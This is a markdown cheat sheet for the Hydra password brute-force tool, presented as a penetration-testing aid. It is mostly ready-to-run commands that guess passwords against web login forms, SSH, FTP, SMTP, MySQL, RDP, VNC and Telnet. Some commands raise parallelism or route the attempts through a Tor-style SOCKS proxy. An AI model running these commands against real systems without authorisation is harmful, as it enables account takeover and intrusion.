## ðŸ”‘ Hydra â€“ Online Password Brute Force Tool

**Hydra** is a fast and flexible command-line tool used for performing brute force attacks against online authentication services.  
It supports a wide range of protocols and is commonly used to test the strength of login mechanisms during penetration testing.

Hydra works by sending multiple authentication requests using username and password wordlists.

### ðŸ”¹ Common Hydra Usage

```bash
# HTTP POST login brute force (single username)
hydra -l admin -P passwords.txt example.com http-post-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

# Dictionary attack with username and password lists
hydra -L users.txt -P passwords.txt example.com http-post-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

# Use custom User-Agent header
hydra -l admin -P passwords.txt example.com http-post-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" \
-H "User-Agent: MyCustomUserAgent"

# Specify a non-standard port
hydra -l admin -P passwords.txt example.com http-post-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" -s 8080

# Route requests through a SOCKS5 proxy
hydra -l admin -P passwords.txt example.com http-post-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" \
-x socks5://localhost:9050

# Brute force using GET method
hydra -l admin -P passwords.txt example.com http-get-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

# Increase parallel login attempts
hydra -l admin -P passwords.txt example.com http-post-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" -t 16

# Stop after first valid password is found
hydra -l admin -P passwords.txt example.com http-post-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" -F

# Suppress verbose output (useful for scripting)
hydra -l admin -P passwords.txt example.com http-post-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" -q

# SSH
hydra -l username -P passwords.txt ssh://target_ip

# FTP
hydra -l admin -P wordlist.txt ftp://ftp.example.com

# SMTP
hydra -l email@example.com -P passwords.txt smtp://mail.example.com

# MySQL
hydra -l root -P passwords.txt mysql://target_ip

# RDP
hydra -l administrator -P passwords.txt rdp://target_ip

# VNC
hydra -l admin -P passwords.txt vnc://target_ip

# Telnet
hydra -l admin -P passwords.txt telnet://target_ip
